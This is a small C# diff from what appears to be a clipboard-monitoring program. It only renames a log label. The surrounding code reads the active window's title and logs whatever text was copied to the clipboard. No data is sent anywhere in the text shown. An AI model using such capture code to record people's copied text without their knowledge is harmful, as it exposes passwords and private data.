@@ -92,7 +92,7 @@ namespace Clipboard
                     StringBuilder sb = new StringBuilder(length + 1);
                     NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
                     Trace.WriteLine("");
-                    Trace.WriteLine("\t[cntrl-C] Clipboard Copied: " + Clipboard.GetText());
+                    Trace.WriteLine("\t[CTRL+C] Clipboard Copied: " + Clipboard.GetText());
                 }
                 //Вызывается для любых необработанных сообщений
                 base.WndProc(ref m);
